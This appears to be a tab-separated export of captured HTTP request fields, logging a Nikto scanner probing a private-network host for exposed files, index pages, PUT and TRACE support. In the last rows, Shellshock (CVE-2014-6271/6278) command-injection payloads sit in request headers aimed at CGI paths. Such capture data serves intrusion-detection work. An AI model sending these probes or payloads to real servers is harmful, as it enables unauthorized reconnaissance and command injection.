http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									1702						1	http://192.168.1.101/web/wp-login.php/192.168.1.101.sql		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/192.168.1.101.sql
																	Keep-Alive										192.168.1.101									1706						1	http://192.168.1.101/web/wp-login.php/192_168_1_101.war		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/192_168_1_101.war
																	Keep-Alive										192.168.1.101									1710						1	http://192.168.1.101/web/wp-login.php/192_168_1_101.war		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/192_168_1_101.war
																	Keep-Alive										192.168.1.101									1714						1	http://192.168.1.101/web/wp-login.php/192.168.1.101.war		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/192.168.1.101.war
																	Keep-Alive										192.168.1.101									1718						1	http://192.168.1.101/web/wp-login.php/192.168.1.101.war		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/192.168.1.101.war
																	Keep-Alive										192.168.1.101									1722						1	http://192.168.1.101/web/wp-login.php/192_168_1_101.sql		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/192_168_1_101.sql
																	Keep-Alive										192.168.1.101									1726						1	http://192.168.1.101/web/wp-login.php/192_168_1_101.sql		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/192_168_1_101.sql
																	Keep-Alive										192.168.1.101									1730						1	http://192.168.1.101/web/wp-login.php/site.alz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/site.alz
																	Keep-Alive										192.168.1.101									1734						1	http://192.168.1.101/web/wp-login.php/site.alz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/wp-login.php/site.alz
																	Keep-Alive										192.168.1.101									1738						1	http://192.168.1.101/web/wp-login.php/index.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.php
																	Keep-Alive										192.168.1.101									1742						1	http://192.168.1.101/web/wp-login.php/index.php3		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.php3
																	Keep-Alive										192.168.1.101									1746						1	http://192.168.1.101/web/wp-login.php/index.php4		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.php4
																	Keep-Alive										192.168.1.101									1750						1	http://192.168.1.101/web/wp-login.php/index.php5		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.php5
																	Keep-Alive										192.168.1.101									1754						1	http://192.168.1.101/web/wp-login.php/index.php7		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.php7
																	Keep-Alive										192.168.1.101									1758						1	http://192.168.1.101/web/wp-login.php/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.html
																	Keep-Alive										192.168.1.101									1762						1	http://192.168.1.101/web/wp-login.php/index.htm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.htm
																	Keep-Alive										192.168.1.101									1766						1	http://192.168.1.101/web/wp-login.php/index.shtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.shtml
																	Keep-Alive										192.168.1.101									1770						1	http://192.168.1.101/web/wp-login.php/index.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.cfm
																	Keep-Alive										192.168.1.101									1774						1	http://192.168.1.101/web/wp-login.php/index.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.cgi
																	Keep-Alive										192.168.1.101									1778						1	http://192.168.1.101/web/wp-login.php/index.pl		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.pl
																	Keep-Alive										192.168.1.101									1782						1	http://192.168.1.101/web/wp-login.php/index.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.asp
																	Keep-Alive										192.168.1.101									1786						1	http://192.168.1.101/web/wp-login.php/index.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.aspx
																	Keep-Alive										192.168.1.101									1790						1	http://192.168.1.101/web/wp-login.php/default.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/default.asp
																	Keep-Alive										192.168.1.101									1794						1	http://192.168.1.101/web/wp-login.php/default.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/default.aspx
																	Keep-Alive										192.168.1.101									1798						1	http://192.168.1.101/web/wp-login.php/default.htm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/default.htm
																	Keep-Alive										192.168.1.101									1802						1	http://192.168.1.101/web/wp-login.php/index.do		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.do
																	Keep-Alive										192.168.1.101									1806						1	http://192.168.1.101/web/wp-login.php/index.jhtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.jhtml
																	Keep-Alive										192.168.1.101									1810						1	http://192.168.1.101/web/wp-login.php/index.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.jsp
																	Keep-Alive										192.168.1.101									1814						1	http://192.168.1.101/web/wp-login.php/index.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/wp-login.php/index.xml
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1818						1	http://192.168.1.101/web/wp-login.php/nikto-test-9Qu3Cr6C.html		PUT				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:put_del_test: PUT)				/web/wp-login.php/nikto-test-9Qu3Cr6C.html
																	Keep-Alive										192.168.1.101									1822						1	http://192.168.1.101/web/wp-login.php/~bin		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:apacheusers: known user)				/web/wp-login.php/~bin
																	Keep-Alive										192.168.1.101									1826						1	http://192.168.1.101/web/wp-login.php/v2/_catalog		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:)				/web/wp-login.php/v2/_catalog
																	Keep-Alive										192.168.1.101									1830						1	http://192.168.1.101/web/wp-login.php*		OPTIONS				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:httpoptions: OPTIONS *)				/web/wp-login.php*
																	Keep-Alive										192.168.1.101									1834						1	http://192.168.1.101/web/wp-login.php/		OPTIONS				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:httpoptions: OPTIONS /)				/web/wp-login.php/
																	Keep-Alive		0	0																1858						1	http:///web/wp-login.php/		PROPFIND				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:httpoptions: PROPFIND)				/web/wp-login.php/
																	Keep-Alive																									1			TRACE				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:httpoptions: TRACE)				/web/wp-login.php/
																	Keep-Alive										192.168.1.101														() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/
																	Keep-Alive										192.168.1.101									1890					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/
																	Keep-Alive										192.168.1.101									1894					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/admin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/admin.cgi
																	Keep-Alive										192.168.1.101									1898					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/administrator.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/administrator.cgi
																	Keep-Alive										192.168.1.101									1902					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/authLogin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/authLogin.cgi
																	Keep-Alive										192.168.1.101									1906					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/bb-hist.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/bb-hist.sh
																	Keep-Alive										192.168.1.101									1910					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/banner.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/banner.cgi
																	Keep-Alive										192.168.1.101									1914					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/book.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/book.cgi
																	Keep-Alive										192.168.1.101									1918					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/cgiinfo.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/cgiinfo.cgi
																	Keep-Alive										192.168.1.101									1922					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/cgitest.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/cgitest.py
																	Keep-Alive										192.168.1.101									1926					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/cgi_wrapper		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/cgi_wrapper
																	Keep-Alive										192.168.1.101									1930					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/contact.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/contact.cgi
																	Keep-Alive										192.168.1.101									1934					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/count.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/count.cgi
																	Keep-Alive										192.168.1.101									1938					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/defaultwebpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/defaultwebpage.cgi
																	Keep-Alive										192.168.1.101									1942					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/download.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/download.cgi
																	Keep-Alive										192.168.1.101									1946					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/entropysearch.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/entropysearch.cgi
																	Keep-Alive										192.168.1.101									1950					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/env.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/env.cgi
																	Keep-Alive										192.168.1.101									1954					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/environment.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/environment.cgi
																	Keep-Alive										192.168.1.101									1958					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/ezmlm-browse		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/ezmlm-browse
																	Keep-Alive										192.168.1.101									1962					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/formmail.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/formmail.cgi
																	Keep-Alive										192.168.1.101									1966					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/FormMail-clone.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/FormMail-clone.cgi
																	Keep-Alive										192.168.1.101									1970					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/guestbook.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/guestbook.cgi
																	Keep-Alive										192.168.1.101									1974					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/helpdesk.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/helpdesk.cgi
																	Keep-Alive										192.168.1.101									1978					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/index.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/index.cgi
																	Keep-Alive										192.168.1.101									1982					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/index.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/index.php
																	Keep-Alive										192.168.1.101									1986					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/index.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/index.pl
																	Keep-Alive										192.168.1.101									1990					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/info.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/info.cgi
																	Keep-Alive										192.168.1.101									1994					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/wp-login.php/info.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/wp-login.php/info.sh
